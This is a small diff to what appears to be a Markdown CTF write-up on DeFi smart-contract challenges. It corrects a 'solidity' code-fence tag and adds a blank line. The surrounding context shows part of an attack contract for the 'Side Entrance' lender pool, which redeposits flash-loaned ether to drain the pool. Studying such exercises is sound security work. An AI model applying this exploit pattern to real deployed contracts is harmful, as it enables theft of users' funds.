@@ -104,7 +104,7 @@ There is a line of code in `flashLoan()`:  `IFlashLoanEtherReceiver(msg.sender).
 
 Here is attack contract:
 
-```soildity
+```solidity
 contract FlashLoanEtherReceiver {
     function execute() external payable {
         SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
@@ -642,6 +642,7 @@ Lastly, here is script I used to exploit the vault.
 ```
 
 <br>
+
 
 ```toc
 
